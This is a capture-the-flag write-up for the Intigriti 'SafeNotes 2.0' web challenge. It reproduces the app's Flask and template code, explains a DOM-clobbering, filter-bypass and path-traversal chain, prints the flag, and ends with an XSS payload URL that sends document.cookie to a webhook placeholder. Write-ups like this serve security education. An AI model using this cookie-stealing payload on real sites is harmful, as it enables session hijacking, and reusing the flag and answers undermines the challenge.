# SafeNotes 2.0 [43 Solves]

## Description

> After receiving numerous bug bounty reports through the intigriti platform, the developer has implemented some security fixes! They are inviting bug hunters to have another go, so do your thing 🫡
>
> `https://ctfd-status.ctf.intigriti.io/safenotes2`
>
> Attachments: safenotes2.zip

<details><summary>Attachment file tree</summary>

```console
$ unzip -t safenotes2.zip
Archive:  safenotes2.zip
    testing: bot/                     OK
    testing: bot/package.json         OK
    testing: bot/index.js             OK
    testing: bot/Dockerfile           OK
    testing: docker-compose.yml       OK
    testing: start.sh                 OK
    testing: web/                     OK
    testing: web/app/                 OK
    testing: web/app/forms.py         OK
    testing: web/app/main.py          OK
    testing: web/app/templates/       OK
    testing: web/app/templates/index.html   OK
    testing: web/app/templates/report.html   OK
    testing: web/app/templates/home.html   OK
    testing: web/app/templates/base.html   OK
    testing: web/app/templates/login.html   OK
    testing: web/app/templates/create.html   OK
    testing: web/app/templates/contact.html   OK
    testing: web/app/templates/view.html   OK
    testing: web/app/templates/register.html   OK
    testing: web/app/models.py        OK
    testing: web/app/views.py         OK
    testing: web/app/static/          OK
    testing: web/app/static/css/      OK
    testing: web/app/static/css/flash.css   OK
    testing: web/app/static/css/general.css   OK
    testing: web/app/static/css/home.css   OK
    testing: web/app/static/css/forms.css   OK
    testing: web/app/static/css/navbar.css   OK
    testing: web/app/static/css/panel.css   OK
    testing: web/app/static/images/   OK
    testing: web/app/static/images/logo.png   OK
    testing: web/app/static/images/create_note.png   OK
    testing: web/app/static/images/view_note.png   OK
    testing: web/app/static/images/favicon.ico   OK
    testing: web/app/static/images/report_note.png   OK
    testing: web/app/__init__.py      OK
    testing: web/entrypoint.sh        OK
    testing: web/requirements.txt     OK
    testing: web/Dockerfile           OK
No errors detected in compressed data of safenotes2.zip.
```

</details>

<details><summary>app/views.py</summary>

```python
import os
from flask import Blueprint, render_template, redirect, url_for, request, flash, jsonify
from flask_login import login_user, login_required, logout_user, current_user
from urllib.parse import urlparse, urljoin
from app import db
from app.models import User, Note, LogEntry
from app.forms import LoginForm, RegisterForm, NoteForm, ContactForm, ReportForm
import logging
import requests
import threading
import uuid

main = Blueprint('main', __name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BASE_URL = os.getenv('BASE_URL', 'http://127.0.0.1')
BOT_URL = os.getenv('BOT_URL', 'http://bot:8000')

reporting_users = set()
reporting_lock = threading.Lock()


@main.route('/')
def index():
    # Change for remote infra deployment
    return render_template('home.html')


@main.route('/home')
def home():
    return render_template('home.html')


@main.route('/api/notes/fetch/<note_id>', methods=['GET'])
def fetch(note_id):
    note = Note.query.get(note_id)
    if note:
        return jsonify({'content': note.content, 'note_id': note.id})
    return jsonify({'error': 'Note not found'}), 404


@main.route('/api/notes/store', methods=['POST'])
@login_required
def store():
    data = request.get_json()
    content = data.get('content')

    # Since we removed the dangerous "debug" field, bleach is no longer needed - DOMPurify should be enough

    note = Note.query.filter_by(user_id=current_user.id).first()
    if note:
        note.content = content
    else:
        note = Note(user_id=current_user.id, content=content)
        db.session.add(note)

    db.session.commit()
    return jsonify({'success': 'Note stored', 'note_id': note.id})


# Monitor for suspicious activity
@main.route('/api/notes/log/<username>', methods=['POST'])
def log_note_access(username):
    data = request.get_json()
    note_id = data.get('note_id')
    content = data.get('content')

    if not note_id or not username or not content:
        return jsonify({"error": "Missing data"}), 400

    log_entry = LogEntry(note_id=note_id, username=username, content=content)
    db.session.add(log_entry)
    db.session.commit()

    return jsonify({"success": "Log entry created", "log_id": log_entry.id, "note_id": note_id}), 201


@main.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user:
            flash('Username already exists. Please choose a different one.', 'danger')
        else:
            user = User(username=form.username.data,
                        password=form.password.data)
            db.session.add(user)
            db.session.commit()
            login_user(user)
            return redirect(url_for('main.home'))
    elif request.method == 'POST':
        flash('Registration Unsuccessful. Please check the errors and try again.', 'danger')
    return render_template('register.html', form=form)


@main.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.password == form.password.data:
            login_user(user)
            return redirect(url_for('main.home'))
        else:
            flash('Login Unsuccessful. Please check username and password', 'danger')
    return render_template('login.html', form=form)


@main.route('/create', methods=['GET', 'POST'])
@login_required
def create_note():
    form = NoteForm()
    if form.validate_on_submit():
        note = Note(user_id=current_user.id, content=form.content.data)
        db.session.merge(note)
        db.session.commit()
        return redirect(url_for('main.view_note', note=note.id))
    return render_template('create.html', form=form)


@main.route('/view', methods=['GET'])
def view_note():
    note_id = request.args.get('note') or ''
    username = current_user.username if current_user.is_authenticated else 'Anonymouse'
    return render_template('view.html', note_id=note_id, username=username)


# People were exploiting an open redirect here, should be secure now!
@main.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            username = data.get('name')
            content = data.get('content')

            if not username or not content:
                return jsonify({"message": "Please provide both your name and message."}), 400

            return jsonify({"message": f'Thank you for your message, {username}. We will be in touch!'}), 200

        username = request.form.get('name')
        content = request.form.get('content')

        if not username or not content:
            flash('Please provide both your name and message.', 'danger')
            return redirect(url_for('main.contact'))

        return render_template('contact.html', form=form, msg=f'Thank you for your message, {username}. We will be in touch!')

    return render_template('contact.html', form=form, msg='Feel free to reach out to us using the form below. We would love to hear from you!')


@main.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('main.home'))


def call_bot(note_url, user_id):
    try:
        response = requests.post(f"{BOT_URL}/visit/", json={"url": note_url})
        if response.status_code == 200:
            logger.info('Bot visit succeeded')
        else:
            logger.error('Bot visit failed')
    finally:
        with reporting_lock:
            reporting_users.remove(user_id)


@main.route('/report', methods=['GET', 'POST'])
@login_required
def report():
    form = ReportForm()
    if form.validate_on_submit():
        note_url = form.note_url.data
        parsed_url = urlparse(note_url)
        base_url_parsed = urlparse(BASE_URL)

        if not parsed_url.scheme.startswith('http'):
            flash('URL must begin with http(s)://', 'danger')
        elif parsed_url.netloc == base_url_parsed.netloc and parsed_url.path == '/view' and 'note=' in parsed_url.query:
            note_id = parsed_url.query[-36:]
            try:
                if uuid.UUID(note_id):
                    with reporting_lock:
                        if current_user.id in reporting_users:
                            flash(
                                'You already have a report in progress. Please respect our moderation capabilities.', 'danger')
                        else:
                            reporting_users.add(current_user.id)
                            threading.Thread(target=call_bot, args=(
                                note_url, current_user.id)).start()
                            flash('Note reported successfully', 'success')
            except ValueError:
                flash(
                    'Invalid note ID! Example format: 12345678-abcd-1234-5678-abc123def456', 'danger')
        else:
            logger.warning(f"Invalid URL provided: {note_url}")
            flash('Please provide a valid note URL, e.g. ' + BASE_URL +
                  '/view?note=12345678-abcd-1234-5678-abc123def456', 'danger')

        return redirect(url_for('main.report'))

    return render_template('report.html', form=form)
```

</details>

<details><summary>app/templates/view.html</summary>

```html+jinja
{% extends "base.html" %} {% block content %}
<h2>View Note</h2>
<p>You can view stored notes here, securely!</p>
<form id="view-note-form" action="{{ url_for('main.view_note') }}" class="note-form">
    <div class="form-group">
        <label for="note-id-input">Enter Note ID:</label>
        <input type="text" name="note_id" id="note-id-input" class="form-control" value="{{ note_id }}" />
    </div>
    <div class="form-group">
        <button type="button" class="btn btn-primary" id="fetch-note-button">
            View Note
        </button>
    </div>
</form>
<div id="note-content-section" style="display: none" class="note-panel">
    <h3>Note Content</h3>
    <div id="note-content" class="note-content"></div>
</div>
<!-- Remember to comment this out when not debugging!! -->
<!-- <div id="debug-content-section" style="display:none;" class="note-panel">
    <h3>Debug Information</h3>
    <div id="debug-content" class="note-content"></div>
</div> -->
<div class="flash-container">
    <div id="flash-message" class="flash-message" style="display: none"></div>
</div>
<div>
    <p>Logged in as: <span id="username">{{ username }}</span></p>
</div>
<script>
    const csrf_token = "{{ csrf_token() }}";

    const urlParams = new URLSearchParams(window.location.search);

    function fetchNoteById(noteId) {
        // Checking "includes" wasn't sufficient, we need to strip ../ *after* we URL decode
        const decodedNoteId = decodeURIComponent(noteId);
        const sanitizedNoteId = decodedNoteId.replace(/\.\.[\/\\]/g, '');
        fetch("/api/notes/fetch/" + sanitizedNoteId, {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.content) {
                    document.getElementById("note-content").innerHTML =
                        DOMPurify.sanitize(data.content);
                    document.getElementById("note-content-section").style.display = "block";
                    showFlashMessage("Note loaded successfully!", "success");
                    // We've seen suspicious activity on this endpoint, let's log some data for review
                    logNoteAccess(sanitizedNoteId, data.content);
                } else if (data.error) {
                    showFlashMessage("Error: " + data.error, "danger");
                } else {
                    showFlashMessage("Note doesn't exist.", "info");
                }
                // Removed the data.debug section, it was vulnerable to XSS!
            });
    }

    function logNoteAccess(noteId, content) {
        // Read the current username, maybe we need to ban them?
        const currentUsername = document.getElementById("username").innerText;
        const username = currentUsername || urlParams.get("name");

        // Just in case, it seems like people can do anything with the client-side!!
        const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');

        fetch("/api/notes/log/" + sanitizedUsername, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": csrf_token,
            },
            body: JSON.stringify({
                name: username,
                note_id: noteId,
                content: content
            }),
        })
            .then(response => response.json())
            .then(data => {
                // Does the log entry data look OK?
                document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
                document.getElementById("debug-content-section").style.display = "block";
            })
            .catch(error => console.error("Logging failed:", error));

    }

    function isValidUUID(noteId) {
        // Fixed regex so note ID must be specified as expected
        const uuidRegex =
            /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        return uuidRegex.test(noteId);
    }

    function validateAndFetchNote(noteId) {
        if (noteId && isValidUUID(noteId.trim())) {
            history.pushState(null, "", "?note=" + noteId);
            fetchNoteById(noteId);
        } else {
            showFlashMessage(
                "Please enter a valid note ID, e.g. 12345678-abcd-1234-5678-abc123def456.",
                "danger"
            );
        }
    }

    document
        .getElementById("fetch-note-button")
        .addEventListener("click", function () {
            const noteId = document
                .getElementById("note-id-input")
                .value.trim();
            validateAndFetchNote(noteId);
        });

    window.addEventListener("load", function () {
        const noteId = urlParams.get("note");
        if (noteId) {
            document.getElementById("note-id-input").value = noteId;
            validateAndFetchNote(noteId);
        }
    });
</script>
{% endblock %}
```

</details>

## Flag

INTIGRITI{54f3n0735_3_w1ll_b3_53cur3_1_pr0m153}

## Summary

- We can create a note with HTML but it's sanitized by DOMPurify latest version
- In app/templates/view.html, `logNoteAccess` function injects `"/api/notes/log/" + sanitizedUsername` response to an element with `debug-content` id
- `sanitizedUsername` variable is user-controllable
  - creating an element with `username` id
  - set name query parameter
  - `replace(/\.\.[\/\\]/g, '')` bypass: `....//` --match--> `..(../)/` --remove-->   `../`
- In app/view.py, `/contact` endpoint is allowed POST methods and responses a `name` value of a request JSON body.

app/templates/view.html

```javascript
    function logNoteAccess(noteId, content) {
        // Read the current username, maybe we need to ban them?
        const currentUsername = document.getElementById("username").innerText;
        const username = currentUsername || urlParams.get("name");

        // Just in case, it seems like people can do anything with the client-side!!
        const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');

        fetch("/api/notes/log/" + sanitizedUsername, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": csrf_token,
            },
            body: JSON.stringify({
                name: username,
                note_id: noteId,
                content: content
            }),
        })
            .then(response => response.json())
            .then(data => {
                // Does the log entry data look OK?
                document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
                document.getElementById("debug-content-section").style.display = "block";
            })
            .catch(error => console.error("Logging failed:", error));

    }
```

app/view.py

```python
@main.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            username = data.get('name')
            content = data.get('content')

            if not username or not content:
                return jsonify({"message": "Please provide both your name and message."}), 400

            return jsonify({"message": f'Thank you for your message, {username}. We will be in touch!'}), 200
# (snip)
```

## Solution

Create a note.

```html
<div id="debug-content-section">
    <div id="debug-content"></div>
</div>

<div id="username"></div>
```

Report the following URL:

```text
https://safenotes2-2.ctf.intigriti.io/view?name=....//....//....//contact%23<img src=x onerror=fetch(`<webhook url>?cookie=`%2bdocument.cookie) />&note=<noteid>
```

See if the webhook request is.
